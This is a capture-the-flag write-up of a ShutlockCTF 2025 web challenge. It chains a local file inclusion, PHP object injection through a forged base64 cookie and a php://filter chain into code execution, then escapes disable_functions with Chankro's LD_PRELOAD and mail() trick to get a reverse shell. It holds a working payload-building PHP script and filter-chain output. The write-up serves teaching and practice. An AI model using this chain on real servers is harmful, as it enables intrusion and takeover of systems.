---
title: Local Terror
author: Fozl
event: ShutlockCTF 2025
categories: [ShutlockCTF_2025, Web]
date: 2025-07-02
tags:
  - lfi
  - php-filter-chain
  - rce
  - sandbox-escape
  - chankro
info:
  description: Welcome, cyber-auditor! For my next movie, "Le Camembert qui Parlait", I used the online tool CinéScript for my script. But I think my script leaked — the site may not be very secure. Take a look and see what you find.
  difficulty: 3
img_path: /assets/img/Writeups/ShutlockCTF_2025/Web/Local_Terror/
image:
  path: /assets/img/Writeups/ShutlockCTF_2025/shutlock2025.png
---

## Challenge Description

{{ page.info.description }}

---

## Recon & Enumeration

We start on a basic showcase website. The "Software" menu is greyed out, but by inspecting the source code, we notice calls to `/api`.

![]({{ page.img_path }}efc7d35677d84090b783622a3ea958a4.png)

There is a form that lets us render user input as HTML or JavaScript, but the PHP option is disabled.

![]({{ page.img_path }}82058e5343e8453abd9622d3bd20b777.png)

Any attempt to use PHP gives an error:

![]({{ page.img_path }}afea1ba34c0c454a8ef549283c1a84c4.png)

Looking at the POST requests, we notice the `version` parameter is used as a filename:

```json
{
  "userName": "Sonic",
  "inputText": "phpinfo();",
  "language": "php",
  "version": "v2.0",
  "rendering": "off"
}
```

If we change `version` to `index.php`, we can leak the PHP source code — a classic LFI. There is a filter against directory traversal, but absolute file paths and other tricks are not blocked.

---

## Source Review & Legacy File Discovery

While reviewing the code, we spot a legacy file:

```html
// Work done based on previous version: old/index-old-do-not-use-please.php. The last code was vulnerable and so must bot be used in any circumstances.
```

We read it through our LFI and focus on the following logic:

```php
// Do not use this file anymore.
// First of all it is not working well. You need to reload the page to see the output.
// And it is vulnerable to attacks. It is not safe to use this file.
// Please delete and tell the prod team to not push this file to the server.

class Parser {
    public $text;
    public $debug;
    public $version;
    public $betterprint;

    function __construct($text, $version, $debug = false, $betterprint = false) { ... }

    function evaluate(){
        if ($this->debug && $this->version === 'v1.0') {
            require_once($this);
        }
        echo $this;
    }

    function __toString() {
        if ($this->betterprint) {
            return $this->text;
        }
        return $this->version;
    }
}
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    setcookie("parser", base64_encode(serialize(new Parser($_POST['inputText'],$_POST['version']))), ...);
}
...
if(isset($_COOKIE["parser"])) {
    echo unserialize(base64_decode($_COOKIE['parser']))->evaluate();
}
```

We realize that we can forge our own `Parser` object, serialize it, base64 it, and set it as the `parser` cookie.

---

## PHP Object Injection → RCE

After reading the legacy `Parser` code, we realize there is a full PHP Object Injection chain leading to code execution.  
Here is exactly how the vulnerability works:

### Step 1: Server deserializes user-controlled object

When we send data through the form, the backend creates a `Parser` object with our parameters, serializes it, base64-encodes it, and stores it in our `parser` cookie.

```php
setcookie("parser", base64_encode(serialize(new Parser($_POST['inputText'],$_POST['version']))), ...);
````

Later, every time we visit the page, the server checks if the `parser` cookie is present.
If so, it **decodes and unserializes it**, and then calls the `evaluate()` method on the resulting object:

```php
if(isset($_COOKIE["parser"])) {
    echo unserialize(base64_decode($_COOKIE['parser']))->evaluate();
}
```

That means we fully control all properties of the object used in `evaluate()`.

---

### Step 2: Triggering the vulnerable code path

Inside `evaluate()`, we see:

```php
function evaluate(){
    if ($this->debug && $this->version === 'v1.0') {
        require_once($this);
    }
    echo $this;
}
```

So if we set:

* `$debug = true`
* `$version = 'v1.0'`

The code will do `require_once($this);`

But `$this` is an object, not a string.

---

### Step 3: How PHP resolves `require_once($this)`

In PHP, when an object is used as a string, it automatically calls its `__toString()` method.

```php
function __toString() {
    if ($this->betterprint) {
        return $this->text;
    }
    return $this->version;
}
```

So if we set:

* `$betterprint = true`
* `$text = [ANYTHING WE WANT]`

Then `require_once($this)` becomes `require_once($this->text)`.

**In other words:**
By setting `debug=true`, `version="v1.0"`, `betterprint=true`, and controlling `text`,
we force the server to include any file path (or stream wrapper) we want.

---

### Step 4: PHP filter chain!

If we set `text` to a filename that contains our PHP code, the server would include it and execute it.
But here, **we have no way to upload a `.php` file to the server**.

However, PHP's `php://filter` wrappers allow us to include special streams that can apply transformations to files or even in-memory content.

In our case, we can generate extremely complex filter chains (with [php\_filter\_chain\_generator.py](https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py)) that let us inject any PHP code for execution, even if direct file upload isn't possible.

```shell
python3 php_filter_chain_generator.py --chain "<? phpinfo(); ?>"
[+] The following gadget chain will generate the following code : <? phpinfo(); ?> (base64 value: PD8gcGhwaW5mbygpOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|...[TRUNCATED]...|convert.base64-decode/resource=php://temp
```

**Note:** This technique is required here because `require_once` expects a valid PHP file, not a raw string of code.

---

### Step 5: Building and delivering the exploit

So, our full attack chain is:

1. Create a `Parser` object with:

   * `debug = true`
   * `version = "v1.0"`
   * `betterprint = true`
   * `text = [our filter chain payload]`
2. Serialize and base64-encode the object, set it as our `parser` cookie.
3. Reload the page — the server unserializes, calls `evaluate()`, and runs `require_once($this->text)`, which executes our injected code.

```php
class Parser {
    public $text;
    public $debug;
    public $version;
    public $betterprint;

    function __construct($text, $version, $debug = false, $betterprint = false) {
        $this->text = $text;
        $this->debug = $debug;
        $this->version = $version;
        $this->betterprint = $betterprint;
    }
}

$text = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|...[TRUNCATED]...|convert.base64-decode/resource=php://temp";
$version = "v1.0";
$debug = true;
$betterprint = true;

$exploit = new Parser($text, $version, $debug, $betterprint);

$payload_raw = serialize($exploit);
$payload_b64 = base64_encode($payload_raw);
$payload_urlencoded = urlencode($payload_b64);

echo "{$payload_urlencoded}\n";
```

We set this as the `parser` cookie, reload, and we have code execution.

---

## Sandbox: Restrictions and Limitations

Once we get code execution, we quickly realize the environment is extremely restricted:

* [`open_basedir`](https://www.bencteux.fr/posts/open_basedir) limits file access to `/var/www/html`
* A huge list of PHP functions are disabled: `exec`, `shell_exec`, `system`, `proc_open`, `popen`, `scandir`, `opendir`, `file_put_contents`, even `print_r`, and many more.
* We can only read/write files in the webroot, but we cannot list filenames or run standard shell commands.

![]({{ page.img_path }}1f32525e320344f8bf21eb8d947bfb10.png)

---

## Getting Real RCE: Escaping PHP with Chankro (LD\_PRELOAD)

To escape this sandbox, we have to abuse mechanisms outside PHP’s control.
After some research, we find [Chankro](https://github.com/TarlogicSecurity/Chankro).
This exploit dates back more than 7 years and is written in python2 (cry of pain), we launch [2to3](https://docs.python.org/3.12/library/2to3.html) on it with a little prayer and it now works with python3!

> The exploit: PHP's `mail()` function spawns `/usr/sbin/sendmail` on the system. If we can set the `LD_PRELOAD` environment variable (using `putenv()`), we can load our own malicious shared object, which gets executed by sendmail and gives us arbitrary code execution outside all PHP restrictions.

We proceed as follows:

* We generate a `.so` (reverse shell payload) and a fake socket using Chankro.
* We write them into `/var/www/html/`.
* We convert the following PHP code in base64 and make a code to write it on the server then decode it (wrapped in a filter chain and delivered via our object injection)

All that's left is to go to the page we've uploaded and the PHP `mail()` function is executed, `sendmail` loads our .so, and we get a real system shell outside the PHP sandbox.

---

## Getting the Flag

Now that we have a real shell, we can finally read all the files in the webroot.
With `ls` we find the flag that was impossible to guess without php's scandir function, which was disabled.

```shell
cat /var/www/html/flag-94583458938490289047237492374.txt
SHLK{fr0m_l177l3_vuln_70_70p_vuln}
```

---

## TL;DR

* Legacy code recovered through LFI, exposing PHP object injection
* Crafted serialized object enables arbitrary file inclusion via controlled property chain
* PHP filter chain used to achieve code execution without file upload
* Environment restricted by open_basedir and a large list of disabled PHP functions, blocking classic shell commands and file listing
* Exploitation of `mail()` with Chankro/LD_PRELOAD bypasses PHP sandbox and grants a system shell
* Flag found in a file with a randomized name

---
